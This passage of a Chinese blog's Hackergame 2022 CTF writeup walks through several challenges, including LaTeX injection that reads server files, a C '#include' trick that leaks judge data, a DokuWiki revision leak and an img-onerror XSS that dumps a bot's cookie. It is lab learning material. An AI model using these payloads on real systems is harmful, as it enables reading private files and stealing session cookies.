inputs[i].<span class="property">value</span> = results[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span><br><span class="line">    btn.<span class="title function_">click</span>()</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>里面的大数加法是在网上找的，然后就，跑一下就自动计算力。</p><p>人类战胜天网力！</p><p><img src="http://cdn.lmark.cc/img/QQ%E6%88%AA%E5%9B%BE20221029232555.png" alt="QQ截图20221029232555"></p><h2 id="旅行照片-2-0"><a href="#旅行照片-2-0" class="headerlink" title="旅行照片 2.0"></a>旅行照片 2.0</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><p><img src="http://cdn.lmark.cc/img/travel-photo-2.jpg" alt="img"></p><p><img src="http://cdn.lmark.cc/img/image-20221107171823868.png"></p><p><img src="http://cdn.lmark.cc/img/image-20221107171843312.png"></p><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>社工题，可以说是很简单了，只要方法和工具用对了，就会很有意思。</p><p>第一题，非常简单，直接右键照片-&gt;属性。可以看到这些所有的信息。</p><p><img src="http://cdn.lmark.cc/img/image-20221107172447738.png"></p><p>第二题，可以说稍微有点难度了。</p><p>首先，从图片中可以看到，这个体育馆上面写着霓虹津。而且路上的车是左行的，所以这个地方应该是霓虹。然后就是这个体育馆的牌匾，他们都说能看出来这是ZOZOMARINE STADIUM，我是死活看不出来，借助了搜图工具搜出来的千叶海洋球馆</p><p>上谷歌地图找找</p><p><img src="http://cdn.lmark.cc/img/image-20230103162524984.png"></p><p>然后看看周边的酒店宾馆啥的，很容易找到一家APA，一家很大的连锁酒店，我同学去霓虹玩的时候还住过，浅浅看一下邮编</p><p><img src="http://cdn.lmark.cc/img/image-20230103162750564.png"></p><p>然后接下来就是手机，从之前的EXIF信息可以看出，这款手机的型号是<code>sm6115(juice)</code>，看起来这是个很抽象的代号，放进google检索一下，第一个结果就是，红米9T？？？什么勾吧，没听说过，查了一下发现在国内这个叫红米NOTE 9，去官网或者淘宝查一下参数即可。分辨率是<code>2340x1080</code></p><p><img src="http://cdn.lmark.cc/img/image-20230103163448917.png"></p><p>最后到了最难的部分，就是查航班轨迹，以前听说过飞机的轨迹是能实时查看的，但是一直没试过，这次可以试试了。首先先找一个可以查看航班轨迹的网站，很多网站都需要会员才能看比较古早的历史数据。所以，<a href="https://globe.adsbexchange.com/">推荐这个</a>一个免费但是可以看比较早的记录，最小时间粒度是10s。</p><p>关于为什么这些网站能看到这么多飞机的航行记录，那是因为飞机在航行过程中会发射特定的无线电信号，里面包含着航班的信息，地面上的人只要接受信息，将其整理出来，就能的到实时的航班轨迹了，这种信号称作<a href="https://zh.wikipedia.org/wiki/%E5%B9%BF%E6%92%AD%E5%BC%8F%E8%87%AA%E5%8A%A8%E7%9B%B8%E5%85%B3%E7%9B%91%E8%A7%86">ADS-B信号</a><img src="http://cdn.lmark.cc/img/image-20230103162125790.png"></p><p>拍摄时的时间为霓虹时间，比我们北京时间快了一个小时，所以他们是东九区，转换一下，拍照片时的UTC时间就是 5 月 14 日 09:23:35 </p><p>这个时候，恰好只有一架飞机从这里飞过，而且还是朝着北方飞，符合题意。这里看到航班号为ANA683，放进google里检索一下，因为一个航班号应该是固定的，所以半年前出发地和目的地应该是相同的，时间上来看应该也是差不多的，第一个结果就是</p><p><img src="http://cdn.lmark.cc/img/image-20230103165256195.png"></p><p>出发地的HND是羽田机场，没错，就是羽田浩司的羽田（话说朗姆篇终于要完结了呜呜）。貌似每个机场都有自己的三个字母的机场代号。这么说，全世界只能用26 * 26 * 26 &#x3D; 17656 个机场了咯。显然不太可能。扯远了。HIJ就是广岛机场，Hiroshima，这个词听着非常舒服，让人想到了广岛之恋。</p><p>知道了所有信息后，答案就出来了</p><p><img src="http://cdn.lmark.cc/img/image-20230103165933448.png"></p><h3 id="我的题解"><a href="#我的题解" class="headerlink" title="我的题解"></a>我的题解</h3><p>以上题解为官方题解，因为我自己做的方法是在拿不上台面，就不耽误人了，简单讲讲，查手机型号时候，我看到摄像头排列形状非常奇怪。身为一个资深米粉，一眼就能看出这个长条形摄像头排列不是近几年的小米手机使用的，因为看起来很廉价，所以百分百是红米。然后我打开淘宝搜了一下，划到第二页我就看到了这部手机，乐。然后航班的话，我一开始找到的网站没有这么高级，我找到的只能看时间段内的航班，然后我就手动试了一遍，大概试了十几二十个，就出结果乐。哎，还是太菜了。</p><h2 id="猜数字"><a href="#猜数字" class="headerlink" title="猜数字"></a>猜数字</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><p>某大型餐饮连锁店的畅销菜品「嫩牛七方」（见下图）自正式线下售卖以来便好评如潮，但囿于产能限制，只有每周四才会对外售卖。你也是一名「嫩牛七方」的爱好者——每个星期四的晚上都能在某家连锁店里找到你的身影。</p><p><img src="http://cdn.lmark.cc/img/image-20230103171244507.png"></p><p>「嫩牛七方」在绝大多数情况下都是七边形，但也会有粗心的店员在制作的时候不小心少折一道，从而将其变成六边形。不过，由于某大型餐饮连锁店对质量的严格把控，哪怕作为十多年以来的忠实粉丝，你也只吃到过两次六边形的「嫩牛七方」。当然，在极少数情况下也会有五边形的「嫩牛七方」——但恐怕仅有百万分之一的概率。上一个五边形的「嫩牛七方」在交易市场上已经卖出足足 50 元的天价了。</p><p>吃到五边形的「嫩牛七方」一直是你这十多来以来的梦想，但囊中羞涩的你，自然是没有办法付得起这 50 块的高价。一周一度的星期四悄然到来，你在各大社交平台发遍了文案，也没有找到人转给你这 50 块钱。这样的悲惨境遇难免使你开始思考人生，在不怀希望的等候中你盯着手机中空旷的点赞通知，思绪却渐渐飘向了这个学期的原子物理。在那里的生活的电子们成群结对，不受制于世俗的欲望却能幸福地在原子轨道间跃迁。可能唯一的缺憾就是诞生了一门完全无法理解的学科，里面的公式如同由符号们随机排列组合构成。这使你想到了你在程序设计课上的作业——一个猜数字小游戏。这个小游戏需要做的事情非常简单：在 0 和 1 之间猜一个数字（精确到小数点后 6 位），并通过反馈的「大」还是「小」修正猜测，直至完全猜中。一次性命中的概率显然也是一百万分之一（和五边形的「嫩牛七方」达成了某种意义上的同构）——但从学霸室友手中借来的概率论与统计学笔记上万千公式的模样在思绪中一瞬而过，于是你默默祈祷着大数定理，虔诚地按下了提交的按钮。</p><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>这道题我当时没做出来，时候看乐一下感觉非常的有趣，这道题是要猜对一个数，正常方法显然概率太低。单次实验中几乎不发生。所以得想别的方法。先看源代码，找了一下，发现比较的地方</p><p><img src="http://cdn.lmark.cc/img/image-20230103173040454.png"></p><p>根据出题人所说，这道题想考的是 IEEE 754 标准定义的浮点数并不满足数学上的全序关系.</p><blockquote><p>数学上的全序关系（<code>&lt;</code>）需要同时满足三条：</p><ol><li>非自反性：对于任意 <code>a</code>，均有 <code>a &lt; a</code> 不成立。</li><li>传递性：对于任意 <code>a</code>、<code>b</code>、和 <code>c</code>，均有 <code>a &lt; b</code> 且 <code>b &lt; c</code> 蕴含 <code>a &lt; c</code> 成立。</li><li>完全性：对于任意 <code>a</code> 和 <code>b</code>，均有 <code>a ≠ b</code> 蕴含 <code>a &lt; b</code> 或 <code>b &lt; a</code> 成立。</li></ol></blockquote><p>第一和第二条满足，但是第三条不满足，因为存在着<code>NaN</code></p><ul><li>对于任意 <code>a</code>，<code>a ≠ NaN</code> 成立，但 <code>a &lt; NaN</code> 或 <code>NaN &lt; a</code> 均不成立。</li></ul><p>所以，只要提交NaN上去，就能通过了，这需要构造一下请求。贴一下官方题解</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /state</span><br><span class="line">Content-Type: text/xml;charset=UTF-8</span><br><span class="line">Authorization: Bearer 1:MEQCIBxs4yBzfjnYS/o+Z3Bm3lJpIZVfvB1dsjSkzcgj8PakAiAtZcKG6tBqDhbOYEXwigMCd6bUBJe7P9KlIr6dxDPu4A==</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span>&gt;</span><span class="tag">&lt;<span class="name">guess</span>&gt;</span>NaN<span class="tag">&lt;/<span class="name">guess</span>&gt;</span><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="LaTeX-机器人"><a href="#LaTeX-机器人" class="headerlink" title="LaTeX 机器人"></a>LaTeX 机器人</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><p>在网上社交群组中交流数学和物理问题时，总是免不了输入公式。而显然大多数常用的聊天软件并不能做到这一点。为了方便大家在水群和卖弱之余能够高效地进行学术交流，G 社的同学制作了一个简单易用的将 LaTeX 公式代码转换成图片的网站，并通过聊天机器人在群里实时将群友发送的公式转换成图片发出。</p><p>这个网站的思路也很直接：把用户输入的 LaTeX 插入到一个写好头部和尾部的 TeX 文件中，将文件编译成 PDF，再将 PDF 裁剪成大小合适的图片。</p><p>“LaTeX 又不是被编译执行的代码，这种东西不会有事的。”</p><p>物理出身的开发者们明显不是太在意这个网站的安全问题，也没有对用户的输入做任何检查。</p><p>那你能想办法获得服务器上放在根目录下的 flag 吗？</p><p><strong>纯文本</strong></p><p>第一个 flag 位于 <code>/flag1</code>，flag 花括号内的内容由纯文本组成（即只包含大写小写字母和数字 0-9）。</p><p><strong>特殊字符混入</strong></p><p>第二个 flag 位于 <code>/flag2</code>，这次，flag 花括号内的内容除了字母和数字之外，还混入了两种特殊字符：下划线（<code>_</code>）和井号（<code>#</code>）。你可能需要想些其他办法了。</p><p><a href="http://101.43.216.170:5244/d/%E5%AD%A6%E4%B9%A0/HackGame2022/latexbot-backend.zip">LaTeX 图片生成后端的 Dockerfile 附件下载</a></p><h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>这里官方题解给的很潦草，感觉不如我自己当时写的。参考一下轩哥的博客[<a href="https://mo01iht.github.io/2022/11/06/HackerGame2022/#Inject">网络攻防]HackerGame初体验-来点免费送的flag | 小二上馄饨的Moonlight-Blog (mo01iht.github.io)</a></p><p>一开始对LaTex可以说是一窍不通，简单了解了一下知道大概是一个公式生成工具，关于LaTex（摘抄自轩哥的博客）</p><blockquote><p>LaTeX(LATEX，音译“拉泰赫”)是一种基于ΤΕΧ的排版系统，由美国计算机学家莱斯利·兰伯特(Leslie Lamport)在20世纪80年代初期开发，利用这种格式，即使使用者没有排版和程序设计的知识也可以充分发挥由TeX所提供的强大功能，能在几天、甚至几小时内生成很多具有书籍质量的印刷品。对于生成复杂表格和数学公式，这一点表现得尤为突出。因此它非常适用于生成高印刷质量的科技和数学类文档。这个系统同样适用于生成从简单的信件到完整书籍的所有其他种类的文档。<br>简单来说，即LaTeX是一种基于ΤΕΧ的排版系统，主要功能是生成数学公式和文章排版，而本文就是由前者数学公式而引出。</p></blockquote><p>怎么获取Flag，一开始没什么思路，上网搜索关键词： LaTex 破解 攻击 注入 。。。然后发现了下面这篇文章，讲的非常好<a href="https://zhuanlan.zhihu.com/p/455901476">实战LaTex Injection - 知乎 (zhihu.com)</a> 先看一下。</p><p>先看一下后台是如何生成PDF的。</p><p><img src="http://cdn.lmark.cc/img/image-20230103204836168.png"></p><p>生成的时候，启用了一个<code>-no-shell-escape</code>选项，</p><p><img src="http://cdn.lmark.cc/img/image-20230103205421071.png"></p><p>这个选项是关闭<code> \write18</code>这条指令，这是一条可以在LaTex里执行命令的用法。但是这里不能用，那就只能用别的了。</p><p>第一问，关键使用到LaTex的一个类似于include的引用功能。就是<code>\input&#123;&#125;</code>,直接读取文件的内容，第一问可以直接读取</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\input</span>&#123;/flag1&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20230104001030354.png"></p><p>第二问就有点难度了，因为其中混入了特殊字符下划线和井号，如果直接input的话会出LaTex的语法错误而导入失败。但是，功夫不负有心人，经过不懈的努力搜寻答案，终于在Google上找到了一个github仓库，里面详细的介绍LaTex注入的一些知识，感兴趣可以仔细看看。[PayloadsAllTheThings&#x2F;LaTeX Injection at master · Mo01iHt&#x2F;PayloadsAllTheThings (github.com)](<a href="https://github.com/Mo01iHt/PayloadsAllTheThings/tree/master/LaTeX">https://github.com/Mo01iHt/PayloadsAllTheThings/tree/master/LaTeX</a> Injection)</p><p><img src="http://cdn.lmark.cc/img/image-20230104000823965.png"></p><p>意思是停用下划线和井号这两个控制字符，如下，和官方题解比起来十分的优雅</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\catcode</span> `<span class="keyword">\#</span>=12 <span class="keyword">\catcode</span> `<span class="keyword">\_</span>=12 <span class="keyword">\input</span>&#123;/flag2&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20230104000953022.png"> </p><h2 id="Flag-的痕迹"><a href="#Flag-的痕迹" class="headerlink" title="Flag 的痕迹"></a>Flag 的痕迹</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><p>小 Z 听说 Dokuwiki 配置很简单，所以在自己的机器上整了一份。可是不巧的是，他一不小心把珍贵的 flag 粘贴到了 wiki 首页提交了！他赶紧改好，并且也把历史记录（revisions）功能关掉了。</p><p>「这样就应该就不会泄漏 flag 了吧」，小 Z 如是安慰自己。</p><p>然而事实真的如此吗？</p><blockquote><p>（题目 Dokuwiki 版本基于 2022-07-31a “Igor”）</p></blockquote><p><img src="http://cdn.lmark.cc/img/image-20230104002021428.png"></p><h3 id="题解-8"><a href="#题解-8" class="headerlink" title="题解"></a>题解</h3><p>官方题解鼓励我们自己动手，丰衣足食，自己本地跑一跑doukuwiki，但是，对于我这种菜鸡来说，理解成互联网漏洞冲浪收集题了。习惯性的先去Google了一下这个wiki，发现是一个蛮古老的wiki服务。直到现在也还在更新。仓库地址：<a href="https://github.com/splitbrain/dokuwiki">splitbrain&#x2F;dokuwiki: The DokuWiki Open Source Wiki Engine (github.com)</a></p><p><img src="http://cdn.lmark.cc/img/image-20230104004418017.png"></p><p>先使用之前学的，Google检索关键词大法</p><p><img src="http://cdn.lmark.cc/img/image-20230104004345929.png"></p><p>看到几篇相关的问答贴，其中有一篇吸引了我的眼球：<a href="https://forum.dokuwiki.org/d/18854-disabling-restoring-old-revision">Disabling restoring old revision - DokuWiki User Forum</a></p><p><img src="http://cdn.lmark.cc/img/image-20230104004909215.png"></p><p>这篇帖子里，楼主说有网络爬虫是不是恢复一些他已经删除掉的帖子，楼下纷纷表示遇到过这种情况。其中有一条回帖，精准命中</p><p><img src="http://cdn.lmark.cc/img/image-20230104013023110.png"></p><p>他说这个回复功能bug，可以越过权限来恢复。然后在22年6月26日的一个更新中修复了这个bug，根据它提供的issue来看，似乎是一个可以利用的bug：<a href="https://github.com/splitbrain/dokuwiki/issues/3421">Although action “Old revisions” is deactivated, all old versions can be viewed. · Issue #3421 · splitbrain&#x2F;dokuwiki (github.com)</a></p><p><img src="http://cdn.lmark.cc/img/image-20230104013428549.png"></p><p>在这个issue的最后，有个人提出，虽然 <code>&amp;do=revisions</code>的漏洞解决了，但是还存在的一个比较的漏洞，我尝试用了一下，然后就成功了。</p><p><img src="http://cdn.lmark.cc/img/image-20230104013659915.png"></p><p>输入这个：[start <a href="http://202.38.93.111:15004/doku.php?do=diff">Flag Wiki]</a>，就可以进入到当前页面的比较历史版本的界面。拿到flag</p><p><img src="http://cdn.lmark.cc/img/image-20230104013922408.png"></p><h2 id="安全的在线测评"><a href="#安全的在线测评" class="headerlink" title="安全的在线测评"></a>安全的在线测评</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><p>传说科大新的在线测评系统（Online Judge）正在锐意开发中。然而，新 OJ 迟迟不见踪影，<a href="https://oj.ustc.edu.cn/">旧的 OJ</a> 和<a href="http://acm.ustc.edu.cn/ustcoj/">更旧的 OJ</a> 却都已经停止了维护。某 2022 级计算机系的新生小 L 等得不耐烦了，当即表示不就是 OJ 吗，他 10 分钟就能写出来一个。</p><p><strong>无法 AC 的题目</strong></p><p>为了验证他写的新 OJ 的安全性，他决定在 OJ 上出一道不可能完成的题目——大整数分解，并且放出豪言：只要有人能 AC 这道题，就能得到传说中的 flag。当然，因为目前 OJ 只能运行 C 语言代码，即使请来一位<a href="https://github.com/ustclug/hackergame2018-writeups/tree/master/official/RSA_of_Z#%E8%A7%A3%E6%B3%95-1">少年班学院的天才</a>恐怕也无济于事。</p><p><strong>动态数据</strong></p><p>为了防止数据意外泄露，小 L 还给 OJ 加入了动态数据生成功能，每次测评会随机生成一部分测试数据。这样，即使 OJ 测试数据泄露，攻击者也没办法通过所有测试样例了吧！（也许吧？）</p><p>判题脚本：<a href="https://hack.lug.ustc.edu.cn/media/0fd509cd-9f1a-588a-b45e-a11331006a3f/online_judge.py">下载</a></p><p>你可以通过 <code>nc 202.38.93.111 10027</code> 来连接题目，或者点击下面的 “打开&#x2F;下载题目” 按钮通过网页终端与远程交互。</p><blockquote><p>如果你不知道 <code>nc</code> 是什么，或者在使用上面的命令时遇到了困难，可以参考我们编写的 <a href="https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/">萌新入门手册：如何使用 nc&#x2F;ncat？</a></p></blockquote><h3 id="题解-9"><a href="#题解-9" class="headerlink" title="题解"></a>题解</h3><p>这道题当时没写出来，但是之后一看，原来和之前做过的一道题类似。也是一个OJ。我首先想到的方法就是include对应的文本。从源代码可以看到，第一题的判断是两个静态的文件，所以我们在编译的时候直接include会发生什么呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload1-1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../data/static.out&quot;</span></span></span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20230104023012985.png"></p><p>这样可以读出第一个数，由于第二个数是使用空格隔开，所以得让错误出现在第二个数，第一个数就得变得合法，这里参考官方题解是用一个变量来接收。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload1-2.c</span></span><br><span class="line"><span class="type">int</span> a = </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../data/static.out&quot;</span></span></span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20230104023400875.png"></p><p>又学到个小技巧！</p><p>然后使用这俩数字，构造答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload1-3.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* p=<span class="string">&quot;9760010330994056474520934906037798583967354072331648925679551350152225627627480095828056866209615240305792136810717998501360021210258189625550663046239919&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* q=<span class="string">&quot;10684702576155937335553595920566407462823007338655463309766538118799757703957743543601066745298528907374149501878689338178500355437330403123549617205342471&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n%s\n&quot;</span>, p, q);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到弗拉哥</p><p><img src="http://cdn.lmark.cc/img/image-20230104023602863.png"></p><p>第二问是动态生成的数据，就不能直接用这种方法读取出来了。不会，先跳过</p><hr><h2 id="线路板"><a href="#线路板" class="headerlink" title="线路板"></a>线路板</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><p>中午起床，看到室友的桌子上又多了一个正方形的盒子。快递标签上一如既往的写着：线路板。和往常一样，你“帮”室友拆开快递并抢先把板子把玩一番。可是突然，你注意到板子表面似乎写着些东西……看起来像是……flag？</p><p><img src="http://cdn.lmark.cc/img/image-20230106215906105.png"></p><p>可是只有开头的几个字母可以看清楚。你一时间不知所措。</p><p>幸运的是，你通过盒子上的联系方式找到了制作厂家，通过板子丝印上的序列号查出了室友的底细，并以放弃每月两次免费 PCB 打样包邮的机会为代价要来了这批带有 flag 的板子的生产文件。那这些文件里会不会包含着更多有关 flag 的信息呢？</p><h3 id="题解-10"><a href="#题解-10" class="headerlink" title="题解"></a>题解</h3><p>主要考察PCB设计过程，参考官方题解：<a href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%BA%BF%E8%B7%AF%E6%9D%BF/README.md">hackergame2022-writeups&#x2F;README.md at master · USTC-Hackergame&#x2F;hackergame2022-writeups (github.com)</a></p><hr><h2 id="Flag-自动机"><a href="#Flag-自动机" class="headerlink" title="Flag 自动机"></a>Flag 自动机</h2><p>没写出来哈哈，这里贴一下官方题解：[hackergame2022-writeups&#x2F;README.md at master · USTC-Hackergame&#x2F;hackergame2022-writeups (github.com)](<a href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/Flag">https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/Flag</a> 自动机&#x2F;README.md)</p><h2 id="微积分计算小练习"><a href="#微积分计算小练习" class="headerlink" title="微积分计算小练习"></a>微积分计算小练习</h2><h3 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><p>小 X 作为某门符号计算课程的助教，为了让大家熟悉软件的使用，他写了一个小网站：上面放着五道简单的题目，只要输入姓名和题目答案，提交后就可以看到自己的分数。</p><p><a href="http://202.38.93.111:10056/?token=905:MEQCIAK63MUT11qcxiwAM1Lk5WM0qZeUFNY1covRpXj7ufuXAiBnhHOZDGNKG55XGQYND2w+FtB11EsQ/XykijsT+uigAQ==">点击此链接访问练习网站</a></p><p>想起自己前几天在公众号上学过的 Java 设计模式免费试听课，本着前后端离心（咦？是前后端离心吗？还是离婚？离。。离谱？总之把功能能拆则拆就对啦）的思想，小 X 还单独写了一个程序，欢迎同学们把自己的成绩链接提交上来。</p><p>总之，因为其先进的设计思想，需要同学们做完练习之后手动把成绩连接贴到这里来：</p><p><a href="http://202.38.93.111:10057/?token=905:MEQCIAK63MUT11qcxiwAM1Lk5WM0qZeUFNY1covRpXj7ufuXAiBnhHOZDGNKG55XGQYND2w+FtB11EsQ/XykijsT+uigAQ==">点击此链接提交练习成绩 URL</a></p><p>点击下方的「打开&#x2F;下载题目」按钮，查看接收成绩链接的程序的源代码。</p><h3 id="题解-11"><a href="#题解-11" class="headerlink" title="题解"></a>题解</h3><p>这道题非常的简单，同时很有意思，一开始写的时候可以说是状况百出，现在回过头来看却是极有意思。首先，这是一个作业提交的页面</p><p><img src="http://cdn.lmark.cc/img/image-20230106223300899.png"></p><p><img src="http://cdn.lmark.cc/img/image-20230106223433749.png"></p><p>然后得到的链接，需要或者粘贴到另一个地方，来获取成绩</p><p><img src="http://cdn.lmark.cc/img/image-20230106223735544.png"></p><p>逻辑上来看是挺简单的，接下来再看看源代码，可以看到flag放在了提交链接的cookie里面。</p><p><img src="http://cdn.lmark.cc/img/image-20230106225405316.png"></p><p>通过查看后端代码可以发现，这个链接提交的页面，是使用了selenium来打开网页，渲染之后，在读取网页的内容。</p><blockquote><p>关于selenium：</p><p>selenium是一个web自动化工具，一般用python写过爬虫的都知道，对于动态加载的网页，想要获取其数据，就得使用selenium来模拟网页的打开。此外，selenium还支持无头浏览器，不打开浏览器界面的情况下访问渲染网页。这是爬取动态网页的利器。</p></blockquote><p>因此，大概思路就出现了。能自定义的输入只有姓名，也就是说需要往里面注入点东西，让后端打开网页的时候自己把cookie输出出来。这是一个XSS注入。</p><p>看起来很简单，然而，做起来可谓是一波三十折。。。。。</p><p>一开始想，直接在姓名处把cookie输出，但是，在尝试直接插入script脚本后发现并不能执行。但是F12里看到的颜色正常的script标签。就算我手动把p标签封闭掉还是不能执行。</p><p><img src="http://cdn.lmark.cc/img/image-20230106233650996.png"></p><p>这个地方一开始困扰了我很久，我焯，这怎么和我学过的不一样，为毛没有转义，也不能执行。后来百度了一下，才知道原来这是标签的innerhtml属性。原因就是直接通过innerHTML动态嵌入的script，浏览器会当做普通的文本，不会当作SCRIPT节点维护到DOM里面，所以调用的时候找不到。也就是说，只要不用script标签就可以，但是如何不适用script标签来执行js代码呢？这时候，就想到了另一个方法，img标签。原本img标签是显示图像用的，但是其有一个onerror字段，在图片报错时执行什么。所以我们此时可以这样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(document.cookie)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>把注入内容输入到姓名内，即可</p><p><img src="http://cdn.lmark.cc/img/image-20230107000123393.png"></p><p>页面正常渲染，就会触发这个报错，然后js语句就被执行了，当然，如果你觉得显示一个破损图片太丑的话，可以隐藏一下。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(document.cookie)&quot;</span> <span class="attr">style</span>=<span class="string">display:none;“</span>&gt;</span>   </span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20230107000545283.png"></p><p>但是，后端不能把弹窗内容显示给我们，所以这里选择将cookie赋值给某个变量，这里可以选择分数和greeting。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;var s = document.cookie;document.querySelector(&#x27;#score&#x27;).innerHTML = s;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将链接复制到后端，可以得到flag</p><p><img src="http://cdn.lmark.cc/img/image-20230107000958675.png"></p><h3 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h3><p>这道题真的很简单，但是一开始方向想错了，由于直接插入script标签没用，然后就想着使用之前用过的xss平台，后面捣鼓了好久都不行，而且链接生成的时候，内容是保存到了的。所以不能自己构造页面来被后端读取。</p><p>失败的伪造界面</p><p><img src="http://cdn.lmark.cc/img/image-20230107003358061.png"></p><h2 id="剩下的题目"><a href="#剩下的题目" class="headerlink" title="剩下的题目"></a>剩下的题目</h2><p>剩下的题目基本上是不会做的，看了题解后有些是恍然大悟了。感觉任重而道远啊。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第一次参加这种CTF，感觉其趣味性很足，整活也很多，很有趣。很多题目是非常的结合实际的。不过做了一圈下来，二进制一道没做，因为基本不会，所以我还是太菜了呜呜，这个题解写了快两个月了（其实一开始写了后面就没动过，后面重新写的时候发现，已经忘了当时怎么做的了呜呜。）。而且这也是我第一次写WriteUp，我喜欢写的时候唠唠嗑，什么奇怪的东西都写点，然后就八千多字了。。。。</p><p><img src="http://cdn.lmark.cc/img/image-20230107005029141.png"></p><p>如果这篇题解有什么错误的地方，欢迎大佬们在评论区批评指正，本人不胜感激。不过我写给自己看的文章应该不会有别人看吧哈哈哈哈哈。</p><p>贴一下：<a href="https://www.zhihu.com/question/561919414">参加中国科学技术大学第九届信息安全大赛（Hackergame 2022）是怎样一种体验？ - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Linux </tag>
            
            <tag> CTF </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>斐讯K2P路由器+Openwrt固件实现校园网多播</title>
      
      <link href="/archives/ff16b028.html"/>
      <url>/archives/ff16b028.html</url>
      
